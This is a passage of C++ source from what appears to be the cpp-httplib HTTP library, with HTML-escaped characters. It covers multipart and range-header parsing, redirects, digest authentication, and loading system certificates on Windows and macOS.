  data_sink.done = [&amp;](void) { done_with_trailer(nullptr); };

  data_sink.done_with_trailer = [&amp;](const Headers &amp;trailer) {
    done_with_trailer(&amp;trailer);
  };

  while (data_available &amp;&amp; !is_shutting_down()) {
    if (!strm.is_writable()) {
      error = Error::Write;
      return false;
    } else if (!content_provider(offset, 0, data_sink)) {
      error = Error::Canceled;
      return false;
    } else if (!ok) {
      error = Error::Write;
      return false;
    }
  }

  error = Error::Success;
  return true;
}

template &lt;typename T, typename U&gt;
inline bool write_content_chunked(Stream &amp;strm,
                                  const ContentProvider &amp;content_provider,
                                  const T &amp;is_shutting_down, U &amp;compressor) {
  auto error = Error::Success;
  return write_content_chunked(strm, content_provider, is_shutting_down,
                               compressor, error);
}

template &lt;typename T&gt;
inline bool redirect(T &amp;cli, Request &amp;req, Response &amp;res,
                     const std::string &amp;path, const std::string &amp;location,
                     Error &amp;error) {
  Request new_req = req;
  new_req.path = path;
  new_req.redirect_count_ -= 1;

  if (res.status == StatusCode::SeeOther_303 &amp;&amp;
      (req.method != "GET" &amp;&amp; req.method != "HEAD")) {
    new_req.method = "GET";
    new_req.body.clear();
    new_req.headers.clear();
  }

  Response new_res;

  auto ret = cli.send(new_req, new_res, error);
  if (ret) {
    req = new_req;
    res = new_res;

    if (res.location.empty()) { res.location = location; }
  }
  return ret;
}

inline std::string params_to_query_str(const Params &amp;params) {
  std::string query;

  for (auto it = params.begin(); it != params.end(); ++it) {
    if (it != params.begin()) { query += "&amp;"; }
    query += it-&gt;first;
    query += "=";
    query += encode_query_param(it-&gt;second);
  }
  return query;
}

inline void parse_query_text(const char *data, std::size_t size,
                             Params &amp;params) {
  std::set&lt;std::string&gt; cache;
  split(data, data + size, '&amp;', [&amp;](const char *b, const char *e) {
    std::string kv(b, e);
    if (cache.find(kv) != cache.end()) { return; }
    cache.insert(std::move(kv));

    std::string key;
    std::string val;
    divide(b, static_cast&lt;std::size_t&gt;(e - b), '=',
           [&amp;](const char *lhs_data, std::size_t lhs_size, const char *rhs_data,
               std::size_t rhs_size) {
             key.assign(lhs_data, lhs_size);
             val.assign(rhs_data, rhs_size);
           });

    if (!key.empty()) {
      params.emplace(decode_url(key, true), decode_url(val, true));
    }
  });
}

inline void parse_query_text(const std::string &amp;s, Params &amp;params) {
  parse_query_text(s.data(), s.size(), params);
}

inline bool parse_multipart_boundary(const std::string &amp;content_type,
                                     std::string &amp;boundary) {
  auto boundary_keyword = "boundary=";
  auto pos = content_type.find(boundary_keyword);
  if (pos == std::string::npos) { return false; }
  auto end = content_type.find(';', pos);
  auto beg = pos + strlen(boundary_keyword);
  boundary = trim_double_quotes_copy(content_type.substr(beg, end - beg));
  return !boundary.empty();
}

inline void parse_disposition_params(const std::string &amp;s, Params &amp;params) {
  std::set&lt;std::string&gt; cache;
  split(s.data(), s.data() + s.size(), ';', [&amp;](const char *b, const char *e) {
    std::string kv(b, e);
    if (cache.find(kv) != cache.end()) { return; }
    cache.insert(kv);

    std::string key;
    std::string val;
    split(b, e, '=', [&amp;](const char *b2, const char *e2) {
      if (key.empty()) {
        key.assign(b2, e2);
      } else {
        val.assign(b2, e2);
      }
    });

    if (!key.empty()) {
      params.emplace(trim_double_quotes_copy((key)),
                     trim_double_quotes_copy((val)));
    }
  });
}

#ifdef CPPHTTPLIB_NO_EXCEPTIONS
inline bool parse_range_header(const std::string &amp;s, Ranges &amp;ranges) {
#else
inline bool parse_range_header(const std::string &amp;s, Ranges &amp;ranges) try {
#endif
  auto is_valid = [](const std::string &amp;str) {
    return std::all_of(str.cbegin(), str.cend(),
                       [](unsigned char c) { return std::isdigit(c); });
  };

  if (s.size() &gt; 7 &amp;&amp; s.compare(0, 6, "bytes=") == 0) {
    const auto pos = static_cast&lt;size_t&gt;(6);
    const auto len = static_cast&lt;size_t&gt;(s.size() - 6);
    auto all_valid_ranges = true;
    split(&amp;s[pos], &amp;s[pos + len], ',', [&amp;](const char *b, const char *e) {
      if (!all_valid_ranges) { return; }

      const auto it = std::find(b, e, '-');
      if (it == e) {
        all_valid_ranges = false;
        return;
      }

      const auto lhs = std::string(b, it);
      const auto rhs = std::string(it + 1, e);
      if (!is_valid(lhs) || !is_valid(rhs)) {
        all_valid_ranges = false;
        return;
      }

      const auto first =
          static_cast&lt;ssize_t&gt;(lhs.empty() ? -1 : std::stoll(lhs));
      const auto last =
          static_cast&lt;ssize_t&gt;(rhs.empty() ? -1 : std::stoll(rhs));
      if ((first == -1 &amp;&amp; last == -1) ||
          (first != -1 &amp;&amp; last != -1 &amp;&amp; first &gt; last)) {
        all_valid_ranges = false;
        return;
      }

      ranges.emplace_back(first, last);
    });
    return all_valid_ranges &amp;&amp; !ranges.empty();
  }
  return false;
#ifdef CPPHTTPLIB_NO_EXCEPTIONS
}
#else
} catch (...) { return false; }
#endif

class MultipartFormDataParser {
public:
  MultipartFormDataParser() = default;

  void set_boundary(std::string &amp;&amp;boundary) {
    boundary_ = boundary;
    dash_boundary_crlf_ = dash_ + boundary_ + crlf_;
    crlf_dash_boundary_ = crlf_ + dash_ + boundary_;
  }

  bool is_valid() const { return is_valid_; }

  bool parse(const char *buf, size_t n, const ContentReceiver &amp;content_callback,
             const MultipartContentHeader &amp;header_callback) {

    buf_append(buf, n);

    while (buf_size() &gt; 0) {
      switch (state_) {
      case 0: { // Initial boundary
        buf_erase(buf_find(dash_boundary_crlf_));
        if (dash_boundary_crlf_.size() &gt; buf_size()) { return true; }
        if (!buf_start_with(dash_boundary_crlf_)) { return false; }
        buf_erase(dash_boundary_crlf_.size());
        state_ = 1;
        break;
      }
      case 1: { // New entry
        clear_file_info();
        state_ = 2;
        break;
      }
      case 2: { // Headers
        auto pos = buf_find(crlf_);
        if (pos &gt; CPPHTTPLIB_HEADER_MAX_LENGTH) { return false; }
        while (pos &lt; buf_size()) {
          // Empty line
          if (pos == 0) {
            if (!header_callback(file_)) {
              is_valid_ = false;
              return false;
            }
            buf_erase(crlf_.size());
            state_ = 3;
            break;
          }

          const auto header = buf_head(pos);

          if (!parse_header(header.data(), header.data() + header.size(),
                            [&amp;](const std::string &amp;, const std::string &amp;) {})) {
            is_valid_ = false;
            return false;
          }

          static const std::string header_content_type = "Content-Type:";

          if (start_with_case_ignore(header, header_content_type)) {
            file_.content_type =
                trim_copy(header.substr(header_content_type.size()));
          } else {
            static const std::regex re_content_disposition(
                R"~(^Content-Disposition:\s*form-data;\s*(.*)$)~",
                std::regex_constants::icase);

            std::smatch m;
            if (std::regex_match(header, m, re_content_disposition)) {
              Params params;
              parse_disposition_params(m[1], params);

              auto it = params.find("name");
              if (it != params.end()) {
                file_.name = it-&gt;second;
              } else {
                is_valid_ = false;
                return false;
              }

              it = params.find("filename");
              if (it != params.end()) { file_.filename = it-&gt;second; }

              it = params.find("filename*");
              if (it != params.end()) {
                // Only allow UTF-8 enconnding...
                static const std::regex re_rfc5987_encoding(
                    R"~(^UTF-8''(.+?)$)~", std::regex_constants::icase);

                std::smatch m2;
                if (std::regex_match(it-&gt;second, m2, re_rfc5987_encoding)) {
                  file_.filename = decode_url(m2[1], false); // override...
                } else {
                  is_valid_ = false;
                  return false;
                }
              }
            }
          }
          buf_erase(pos + crlf_.size());
          pos = buf_find(crlf_);
        }
        if (state_ != 3) { return true; }
        break;
      }
      case 3: { // Body
        if (crlf_dash_boundary_.size() &gt; buf_size()) { return true; }
        auto pos = buf_find(crlf_dash_boundary_);
        if (pos &lt; buf_size()) {
          if (!content_callback(buf_data(), pos)) {
            is_valid_ = false;
            return false;
          }
          buf_erase(pos + crlf_dash_boundary_.size());
          state_ = 4;
        } else {
          auto len = buf_size() - crlf_dash_boundary_.size();
          if (len &gt; 0) {
            if (!content_callback(buf_data(), len)) {
              is_valid_ = false;
              return false;
            }
            buf_erase(len);
          }
          return true;
        }
        break;
      }
      case 4: { // Boundary
        if (crlf_.size() &gt; buf_size()) { return true; }
        if (buf_start_with(crlf_)) {
          buf_erase(crlf_.size());
          state_ = 1;
        } else {
          if (dash_.size() &gt; buf_size()) { return true; }
          if (buf_start_with(dash_)) {
            buf_erase(dash_.size());
            is_valid_ = true;
            buf_erase(buf_size()); // Remove epilogue
          } else {
            return true;
          }
        }
        break;
      }
      }
    }

    return true;
  }

private:
  void clear_file_info() {
    file_.name.clear();
    file_.filename.clear();
    file_.content_type.clear();
  }

  bool start_with_case_ignore(const std::string &amp;a,
                              const std::string &amp;b) const {
    if (a.size() &lt; b.size()) { return false; }
    for (size_t i = 0; i &lt; b.size(); i++) {
      if (case_ignore::to_lower(a[i]) != case_ignore::to_lower(b[i])) {
        return false;
      }
    }
    return true;
  }

  const std::string dash_ = "--";
  const std::string crlf_ = "\r\n";
  std::string boundary_;
  std::string dash_boundary_crlf_;
  std::string crlf_dash_boundary_;

  size_t state_ = 0;
  bool is_valid_ = false;
  MultipartFormData file_;

  // Buffer
  bool start_with(const std::string &amp;a, size_t spos, size_t epos,
                  const std::string &amp;b) const {
    if (epos - spos &lt; b.size()) { return false; }
    for (size_t i = 0; i &lt; b.size(); i++) {
      if (a[i + spos] != b[i]) { return false; }
    }
    return true;
  }

  size_t buf_size() const { return buf_epos_ - buf_spos_; }

  const char *buf_data() const { return &amp;buf_[buf_spos_]; }

  std::string buf_head(size_t l) const { return buf_.substr(buf_spos_, l); }

  bool buf_start_with(const std::string &amp;s) const {
    return start_with(buf_, buf_spos_, buf_epos_, s);
  }

  size_t buf_find(const std::string &amp;s) const {
    auto c = s.front();

    size_t off = buf_spos_;
    while (off &lt; buf_epos_) {
      auto pos = off;
      while (true) {
        if (pos == buf_epos_) { return buf_size(); }
        if (buf_[pos] == c) { break; }
        pos++;
      }

      auto remaining_size = buf_epos_ - pos;
      if (s.size() &gt; remaining_size) { return buf_size(); }

      if (start_with(buf_, pos, buf_epos_, s)) { return pos - buf_spos_; }

      off = pos + 1;
    }

    return buf_size();
  }

  void buf_append(const char *data, size_t n) {
    auto remaining_size = buf_size();
    if (remaining_size &gt; 0 &amp;&amp; buf_spos_ &gt; 0) {
      for (size_t i = 0; i &lt; remaining_size; i++) {
        buf_[i] = buf_[buf_spos_ + i];
      }
    }
    buf_spos_ = 0;
    buf_epos_ = remaining_size;

    if (remaining_size + n &gt; buf_.size()) { buf_.resize(remaining_size + n); }

    for (size_t i = 0; i &lt; n; i++) {
      buf_[buf_epos_ + i] = data[i];
    }
    buf_epos_ += n;
  }

  void buf_erase(size_t size) { buf_spos_ += size; }

  std::string buf_;
  size_t buf_spos_ = 0;
  size_t buf_epos_ = 0;
};

inline std::string random_string(size_t length) {
  static const char data[] =
      "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  // std::random_device might actually be deterministic on some
  // platforms, but due to lack of support in the c++ standard library,
  // doing better requires either some ugly hacks or breaking portability.
  static std::random_device seed_gen;

  // Request 128 bits of entropy for initialization
  static std::seed_seq seed_sequence{seed_gen(), seed_gen(), seed_gen(),
                                     seed_gen()};

  static std::mt19937 engine(seed_sequence);

  std::string result;
  for (size_t i = 0; i &lt; length; i++) {
    result += data[engine() % (sizeof(data) - 1)];
  }
  return result;
}

inline std::string make_multipart_data_boundary() {
  return "--cpp-httplib-multipart-data-" + detail::random_string(16);
}

inline bool is_multipart_boundary_chars_valid(const std::string &amp;boundary) {
  auto valid = true;
  for (size_t i = 0; i &lt; boundary.size(); i++) {
    auto c = boundary[i];
    if (!std::isalnum(c) &amp;&amp; c != '-' &amp;&amp; c != '_') {
      valid = false;
      break;
    }
  }
  return valid;
}

template &lt;typename T&gt;
inline std::string
serialize_multipart_formdata_item_begin(const T &amp;item,
                                        const std::string &amp;boundary) {
  std::string body = "--" + boundary + "\r\n";
  body += "Content-Disposition: form-data; name=\"" + item.name + "\"";
  if (!item.filename.empty()) {
    body += "; filename=\"" + item.filename + "\"";
  }
  body += "\r\n";
  if (!item.content_type.empty()) {
    body += "Content-Type: " + item.content_type + "\r\n";
  }
  body += "\r\n";

  return body;
}

inline std::string serialize_multipart_formdata_item_end() { return "\r\n"; }

inline std::string
serialize_multipart_formdata_finish(const std::string &amp;boundary) {
  return "--" + boundary + "--\r\n";
}

inline std::string
serialize_multipart_formdata_get_content_type(const std::string &amp;boundary) {
  return "multipart/form-data; boundary=" + boundary;
}

inline std::string
serialize_multipart_formdata(const MultipartFormDataItems &amp;items,
                             const std::string &amp;boundary, bool finish = true) {
  std::string body;

  for (const auto &amp;item : items) {
    body += serialize_multipart_formdata_item_begin(item, boundary);
    body += item.content + serialize_multipart_formdata_item_end();
  }

  if (finish) { body += serialize_multipart_formdata_finish(boundary); }

  return body;
}

inline bool range_error(Request &amp;req, Response &amp;res) {
  if (!req.ranges.empty() &amp;&amp; 200 &lt;= res.status &amp;&amp; res.status &lt; 300) {
    ssize_t contant_len = static_cast&lt;ssize_t&gt;(
        res.content_length_ ? res.content_length_ : res.body.size());

    ssize_t prev_first_pos = -1;
    ssize_t prev_last_pos = -1;
    size_t overwrapping_count = 0;

    // NOTE: The following Range check is based on '14.2. Range' in RFC 9110
    // 'HTTP Semantics' to avoid potential denial-of-service attacks.
    // https://www.rfc-editor.org/rfc/rfc9110#section-14.2

    // Too many ranges
    if (req.ranges.size() &gt; CPPHTTPLIB_RANGE_MAX_COUNT) { return true; }

    for (auto &amp;r : req.ranges) {
      auto &amp;first_pos = r.first;
      auto &amp;last_pos = r.second;

      if (first_pos == -1 &amp;&amp; last_pos == -1) {
        first_pos = 0;
        last_pos = contant_len;
      }

      if (first_pos == -1) {
        first_pos = contant_len - last_pos;
        last_pos = contant_len - 1;
      }

      // NOTE: RFC-9110 '14.1.2. Byte Ranges':
      // A client can limit the number of bytes requested without knowing the
      // size of the selected representation. If the last-pos value is absent,
      // or if the value is greater than or equal to the current length of the
      // representation data, the byte range is interpreted as the remainder of
      // the representation (i.e., the server replaces the value of last-pos
      // with a value that is one less than the current length of the selected
      // representation).
      // https://www.rfc-editor.org/rfc/rfc9110.html#section-14.1.2-6
      if (last_pos == -1 || last_pos &gt;= contant_len) {
        last_pos = contant_len - 1;
      }

      // Range must be within content length
      if (!(0 &lt;= first_pos &amp;&amp; first_pos &lt;= last_pos &amp;&amp;
            last_pos &lt;= contant_len - 1)) {
        return true;
      }

      // Ranges must be in ascending order
      if (first_pos &lt;= prev_first_pos) { return true; }

      // Request must not have more than two overlapping ranges
      if (first_pos &lt;= prev_last_pos) {
        overwrapping_count++;
        if (overwrapping_count &gt; 2) { return true; }
      }

      prev_first_pos = (std::max)(prev_first_pos, first_pos);
      prev_last_pos = (std::max)(prev_last_pos, last_pos);
    }
  }

  return false;
}

inline std::pair&lt;size_t, size_t&gt;
get_range_offset_and_length(Range r, size_t content_length) {
  assert(r.first != -1 &amp;&amp; r.second != -1);
  assert(0 &lt;= r.first &amp;&amp; r.first &lt; static_cast&lt;ssize_t&gt;(content_length));
  assert(r.first &lt;= r.second &amp;&amp;
         r.second &lt; static_cast&lt;ssize_t&gt;(content_length));
  (void)(content_length);
  return std::make_pair(r.first, static_cast&lt;size_t&gt;(r.second - r.first) + 1);
}

inline std::string make_content_range_header_field(
    const std::pair&lt;size_t, size_t&gt; &amp;offset_and_length, size_t content_length) {
  auto st = offset_and_length.first;
  auto ed = st + offset_and_length.second - 1;

  std::string field = "bytes ";
  field += std::to_string(st);
  field += "-";
  field += std::to_string(ed);
  field += "/";
  field += std::to_string(content_length);
  return field;
}

template &lt;typename SToken, typename CToken, typename Content&gt;
bool process_multipart_ranges_data(const Request &amp;req,
                                   const std::string &amp;boundary,
                                   const std::string &amp;content_type,
                                   size_t content_length, SToken stoken,
                                   CToken ctoken, Content content) {
  for (size_t i = 0; i &lt; req.ranges.size(); i++) {
    ctoken("--");
    stoken(boundary);
    ctoken("\r\n");
    if (!content_type.empty()) {
      ctoken("Content-Type: ");
      stoken(content_type);
      ctoken("\r\n");
    }

    auto offset_and_length =
        get_range_offset_and_length(req.ranges[i], content_length);

    ctoken("Content-Range: ");
    stoken(make_content_range_header_field(offset_and_length, content_length));
    ctoken("\r\n");
    ctoken("\r\n");

    if (!content(offset_and_length.first, offset_and_length.second)) {
      return false;
    }
    ctoken("\r\n");
  }

  ctoken("--");
  stoken(boundary);
  ctoken("--");

  return true;
}

inline void make_multipart_ranges_data(const Request &amp;req, Response &amp;res,
                                       const std::string &amp;boundary,
                                       const std::string &amp;content_type,
                                       size_t content_length,
                                       std::string &amp;data) {
  process_multipart_ranges_data(
      req, boundary, content_type, content_length,
      [&amp;](const std::string &amp;token) { data += token; },
      [&amp;](const std::string &amp;token) { data += token; },
      [&amp;](size_t offset, size_t length) {
        assert(offset + length &lt;= content_length);
        data += res.body.substr(offset, length);
        return true;
      });
}

inline size_t get_multipart_ranges_data_length(const Request &amp;req,
                                               const std::string &amp;boundary,
                                               const std::string &amp;content_type,
                                               size_t content_length) {
  size_t data_length = 0;

  process_multipart_ranges_data(
      req, boundary, content_type, content_length,
      [&amp;](const std::string &amp;token) { data_length += token.size(); },
      [&amp;](const std::string &amp;token) { data_length += token.size(); },
      [&amp;](size_t /*offset*/, size_t length) {
        data_length += length;
        return true;
      });

  return data_length;
}

template &lt;typename T&gt;
inline bool
write_multipart_ranges_data(Stream &amp;strm, const Request &amp;req, Response &amp;res,
                            const std::string &amp;boundary,
                            const std::string &amp;content_type,
                            size_t content_length, const T &amp;is_shutting_down) {
  return process_multipart_ranges_data(
      req, boundary, content_type, content_length,
      [&amp;](const std::string &amp;token) { strm.write(token); },
      [&amp;](const std::string &amp;token) { strm.write(token); },
      [&amp;](size_t offset, size_t length) {
        return write_content(strm, res.content_provider_, offset, length,
                             is_shutting_down);
      });
}

inline bool expect_content(const Request &amp;req) {
  if (req.method == "POST" || req.method == "PUT" || req.method == "PATCH" ||
      req.method == "DELETE") {
    return true;
  }
  if (req.has_header("Content-Length") &amp;&amp;
      req.get_header_value_u64("Content-Length") &gt; 0) {
    return true;
  }
  if (is_chunked_transfer_encoding(req.headers)) { return true; }
  return false;
}

inline bool has_crlf(const std::string &amp;s) {
  auto p = s.c_str();
  while (*p) {
    if (*p == '\r' || *p == '\n') { return true; }
    p++;
  }
  return false;
}

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
inline std::string message_digest(const std::string &amp;s, const EVP_MD *algo) {
  auto context = std::unique_ptr&lt;EVP_MD_CTX, decltype(&amp;EVP_MD_CTX_free)&gt;(
      EVP_MD_CTX_new(), EVP_MD_CTX_free);

  unsigned int hash_length = 0;
  unsigned char hash[EVP_MAX_MD_SIZE];

  EVP_DigestInit_ex(context.get(), algo, nullptr);
  EVP_DigestUpdate(context.get(), s.c_str(), s.size());
  EVP_DigestFinal_ex(context.get(), hash, &amp;hash_length);

  std::stringstream ss;
  for (auto i = 0u; i &lt; hash_length; ++i) {
    ss &lt;&lt; std::hex &lt;&lt; std::setw(2) &lt;&lt; std::setfill('0')
       &lt;&lt; static_cast&lt;unsigned int&gt;(hash[i]);
  }

  return ss.str();
}

inline std::string MD5(const std::string &amp;s) {
  return message_digest(s, EVP_md5());
}

inline std::string SHA_256(const std::string &amp;s) {
  return message_digest(s, EVP_sha256());
}

inline std::string SHA_512(const std::string &amp;s) {
  return message_digest(s, EVP_sha512());
}

inline std::pair&lt;std::string, std::string&gt; make_digest_authentication_header(
    const Request &amp;req, const std::map&lt;std::string, std::string&gt; &amp;auth,
    size_t cnonce_count, const std::string &amp;cnonce, const std::string &amp;username,
    const std::string &amp;password, bool is_proxy = false) {
  std::string nc;
  {
    std::stringstream ss;
    ss &lt;&lt; std::setfill('0') &lt;&lt; std::setw(8) &lt;&lt; std::hex &lt;&lt; cnonce_count;
    nc = ss.str();
  }

  std::string qop;
  if (auth.find("qop") != auth.end()) {
    qop = auth.at("qop");
    if (qop.find("auth-int") != std::string::npos) {
      qop = "auth-int";
    } else if (qop.find("auth") != std::string::npos) {
      qop = "auth";
    } else {
      qop.clear();
    }
  }

  std::string algo = "MD5";
  if (auth.find("algorithm") != auth.end()) { algo = auth.at("algorithm"); }

  std::string response;
  {
    auto H = algo == "SHA-256"   ? detail::SHA_256
             : algo == "SHA-512" ? detail::SHA_512
                                 : detail::MD5;

    auto A1 = username + ":" + auth.at("realm") + ":" + password;

    auto A2 = req.method + ":" + req.path;
    if (qop == "auth-int") { A2 += ":" + H(req.body); }

    if (qop.empty()) {
      response = H(H(A1) + ":" + auth.at("nonce") + ":" + H(A2));
    } else {
      response = H(H(A1) + ":" + auth.at("nonce") + ":" + nc + ":" + cnonce +
                   ":" + qop + ":" + H(A2));
    }
  }

  auto opaque = (auth.find("opaque") != auth.end()) ? auth.at("opaque") : "";

  auto field = "Digest username=\"" + username + "\", realm=\"" +
               auth.at("realm") + "\", nonce=\"" + auth.at("nonce") +
               "\", uri=\"" + req.path + "\", algorithm=" + algo +
               (qop.empty() ? ", response=\""
                            : ", qop=" + qop + ", nc=" + nc + ", cnonce=\"" +
                                  cnonce + "\", response=\"") +
               response + "\"" +
               (opaque.empty() ? "" : ", opaque=\"" + opaque + "\"");

  auto key = is_proxy ? "Proxy-Authorization" : "Authorization";
  return std::make_pair(key, field);
}

inline bool is_ssl_peer_could_be_closed(SSL *ssl, socket_t sock) {
  detail::set_nonblocking(sock, true);
  auto se = detail::scope_exit([&amp;]() { detail::set_nonblocking(sock, false); });

  char buf[1];
  return !SSL_peek(ssl, buf, 1) &amp;&amp;
         SSL_get_error(ssl, 0) == SSL_ERROR_ZERO_RETURN;
}

#ifdef _WIN32
// NOTE: This code came up with the following stackoverflow post:
// https://stackoverflow.com/questions/9507184/can-openssl-on-windows-use-the-system-certificate-store
inline bool load_system_certs_on_windows(X509_STORE *store) {
  auto hStore = CertOpenSystemStoreW((HCRYPTPROV_LEGACY)NULL, L"ROOT");
  if (!hStore) { return false; }

  auto result = false;
  PCCERT_CONTEXT pContext = NULL;
  while ((pContext = CertEnumCertificatesInStore(hStore, pContext)) !=
         nullptr) {
    auto encoded_cert =
        static_cast&lt;const unsigned char *&gt;(pContext-&gt;pbCertEncoded);

    auto x509 = d2i_X509(NULL, &amp;encoded_cert, pContext-&gt;cbCertEncoded);
    if (x509) {
      X509_STORE_add_cert(store, x509);
      X509_free(x509);
      result = true;
    }
  }

  CertFreeCertificateContext(pContext);
  CertCloseStore(hStore, 0);

  return result;
}
#elif defined(CPPHTTPLIB_USE_CERTS_FROM_MACOSX_KEYCHAIN) &amp;&amp; defined(__APPLE__)
#if TARGET_OS_OSX
template &lt;typename T&gt;
using CFObjectPtr =
    std::unique_ptr&lt;typename std::remove_pointer&lt;T&gt;::type, void (*)(CFTypeRef)&gt;;

inline void cf_object_ptr_deleter(CFTypeRef obj) {
  if (obj) { CFRelease(obj); }
}

inline bool retrieve_certs_from_keychain(CFObjectPtr&lt;CFArrayRef&gt; &amp;certs) {
  CFStringRef keys[] = {kSecClass, kSecMatchLimit, kSecReturnRef};
  CFTypeRef values[] = {kSecClassCertificate, kSecMatchLimitAll,
                        kCFBooleanTrue};

  CFObjectPtr&lt;CFDictionaryRef&gt; query(
      CFDictionaryCreate(nullptr, reinterpret_cast&lt;const void **&gt;(keys), values,
                         sizeof(keys) / sizeof(keys[0]),
                         &amp;kCFTypeDictionaryKeyCallBacks,
                         &amp;kCFTypeDictionaryValueCallBacks),
      cf_object_ptr_deleter);

  if (!query) { return false; }

  CFTypeRef security_items = nullptr;
  if (SecItemCopyMatching(query.get(), &amp;security_items) != errSecSuccess ||
      CFArrayGetTypeID() != CFGetTypeID(security_items)) {
    return false;
  }

  certs.reset(reinterpret_cast&lt;CFArrayRef&gt;(security_items));
  return true;
}

inline bool retrieve_root_certs_from_keychain(CFObjectPtr&lt;CFArrayRef&gt; &amp;certs) {
  CFArrayRef root_security_items = nullptr;
  if (SecTrustCopyAnchorCertificates(&amp;root_security_items) != errSecSuccess) {
    return false;
  }

  certs.reset(root_security_items);
  return true;
}

inline bool add_certs_to_x509_store(CFArrayRef certs, X509_STORE *store) {
  auto result = false;
  for (auto i = 0; i &lt; CFArrayGetCount(certs); ++i) {
    const auto cert = reinterpret_cast&lt;const __SecCertificate *&gt;(
        CFArrayGetValueAtIndex(certs, i));

    if (SecCertificateGetTypeID() != CFGetTypeID(cert)) { continue; }

    CFDataRef cert_data = nullptr;
    if (SecItemExport(cert, kSecFormatX509Cert, 0, nullptr, &amp;cert_data) !=
        errSecSuccess) {
      continue;
    }

    CFObjectPtr&lt;CFDataRef&gt; cert_data_ptr(cert_data, cf_object_ptr_deleter);

    auto encoded_cert = static_cast&lt;const unsigned char *&gt;(
        CFDataGetBytePtr(cert_data_ptr.get()));

    auto x509 =
        d2i_X509(NULL, &amp;encoded_cert, CFDataGetLength(cert_data_ptr.get()));

    if (x509) {
      X509_STORE_add_cert(store, x509);
      X509_free(x509);
      result = true;
    }
  }

  return result;
}

inline bool load_system_certs_on_macos(X509_STORE *store) {
  auto result = false;
  CFObjectPtr&lt;CFArrayRef&gt; certs(nullptr, cf_object_ptr_deleter);
  if (retrieve_certs_from_keychain(certs) &amp;&amp; certs) {
    result = add_certs_to_x509_store(certs.get(), store);
  }

  if (retrieve_root_certs_from_keychain(certs) &amp;&amp; certs) {
    result = add_certs_to_x509_store(certs.get(), store) || result;
  }

  return result;
}
#endif // TARGET_OS_OSX
#endif // _WIN32
#endif // CPPHTTPLIB_OPENSSL_SUPPORT

#ifdef _WIN32
class WSInit {
public:
  WSInit() {
    WSADATA wsaData;
    if (WSAStartup(0x0002, &amp;wsaData) == 0) is_valid_ = true;
  }

  ~WSInit() {
    if (is_valid_) WSACleanup();
  }

  bool is_valid_ = false;
};

static WSInit wsinit_;
#endif

inline bool parse_www_authenticate(const Response &amp;res,
                                   std::map&lt;std::string, std::string&gt; &amp;auth,
                                   bool is_proxy) {
  auto auth_key = is_proxy ? "Proxy-Authenticate" : "WWW-Authenticate";
  if (res.has_header(auth_key)) {
    static auto re = std::regex(R"~((?:(?:,\s*)?(.+?)=(?:"(.*?)"|([^,]*))))~");
    auto s = res.get_header_value(auth_key);
    auto pos = s.find(' ');
    if (pos != std::string::npos) {
      auto type = s.substr(0, pos);
      if (type == "Basic") {
        return false;
      } else if (type == "Digest") {
        s = s.substr(pos + 1);
        auto beg = std::sregex_iterator(s.begin(), s.end(), re);
        for (auto i = beg; i != std::sregex_iterator(); ++i) {
          const auto &amp;m = *i;
          auto key = s.substr(static_cast&lt;size_t&gt;(m.position(1)),
                              static_cast&lt;size_t&gt;(m.length(1)));
          auto val = m.length(2) &gt; 0
                         ? s.substr(static_cast&lt;size_t&gt;(m.position(2)),
                                    static_cast&lt;size_t&gt;(m.length(2)))
                         : s.substr(static_cast&lt;size_t&gt;(m.position(3)),
                                    static_cast&lt;size_t&gt;(m.length(3)));
          auth[key] = val;
        }
        return true;
      }
    }
  }
  return false;
}

class ContentProviderAdapter {
public:
  explicit ContentProviderAdapter(
      ContentProviderWithoutLength &amp;&amp;content_provider)
      : content_provider_(content_provider) {}

  bool operator()(size_t offset, size_t, DataSink &amp;sink) {
    return content_provider_(offset, sink);
  }

private:
  ContentProviderWithoutLength content_provider_;
};

} // namespace detail

inline std::string hosted_at(const std::string &amp;hostname) {
  std::vector&lt;std::string&gt; addrs;
  hosted_at(hostname, addrs);
  if (addrs.empty()) { return std::string(); }
  return addrs[0];
}

inline void hosted_at(const std::string &amp;hostname,
                      std::vector&lt;std::string&gt; &amp;addrs) {
  struct addrinfo hints;
  struct addrinfo *result;

  memset(&amp;hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = 0;

  if (getaddrinfo(hostname.c_str(), nullptr, &amp;hints, &amp;result)) {
#if defined __linux__ &amp;&amp; !defined __ANDROID__
    res_init();
#endif
    return;
  }
  auto se = detail::scope_exit([&amp;] { freeaddrinfo(result); });

  for (auto rp = result; rp; rp = rp-&gt;ai_next) {
    const auto &amp;addr =
        *reinterpret_cast&lt;struct sockaddr_storage *&gt;(rp-&gt;ai_addr);
    std::string ip;
    auto dummy = -1;
    if (detail::get_ip_and_port(addr, sizeof(struct sockaddr_storage), ip,
                                dummy)) {
      addrs.push_back(ip);
    }
  }
}

inline std::string append_query_params(const std::string &amp;path,
                                       const Params &amp;params) {
  std::string path_with_query = path;
  const static std::regex re("[^?]+\\?.*");
  auto delm = std::regex_match(path, re) ? '&amp;' : '?';
  path_with_query += delm + detail::params_to_query_str(params);
  return path_with_query;
}

// Header utilities
inline std::pair&lt;std::string, std::string&gt;
make_range_header(const Ranges &amp;ranges) {
  std::string field = "bytes=";
  auto i = 0;
  for (const auto &amp;r : ranges) {
    if (i != 0) { field += ", "; }
    if (r.first != -1) { field += std::to_string(r.first); }
    field += '-';
    if (r.second != -1) { field += std::to_string(r.second); }
    i++;
  }
  return std::make_pair("Range", std::move(field));
}

inline std::pair&lt;std::string, std::string&gt;
make_basic_authentication_header(const std::string &amp;username,
                                 const std::string &amp;password, bool is_proxy) {
  auto field = "Basic " + detail::base64_encode(username + ":" + password);
  auto key = is_proxy ? "Proxy-Authorization" : "Authorization";
  return std::make_pair(key, std::move(field));
}

inline std::pair&lt;std::string, std::string&gt;
make_bearer_token_authentication_header(const std::string &amp;token,
                                        bool is_proxy = false) {
  auto field = "Bearer " + token;
  auto key = is_proxy ? "Proxy-Authorization" : "Authorization";
  return std::make_pair(key, std::move(field));
}

// Request implementation
inline bool Request::has_header(const std::string &amp;key) const {
  return detail::has_header(headers, key);
}

inline std::string Request::get_header_value(const std::string &amp;key,
                                             const char *def, size_t id) const {
  return detail::get_header_value(headers, key, def, id);
}

inline size_t Request::get_header_value_count(const std::string &amp;key) const {
  auto r = headers.equal_range(key);
  return static_cast&lt;size_t&gt;(std::distance(r.first, r.second));
}

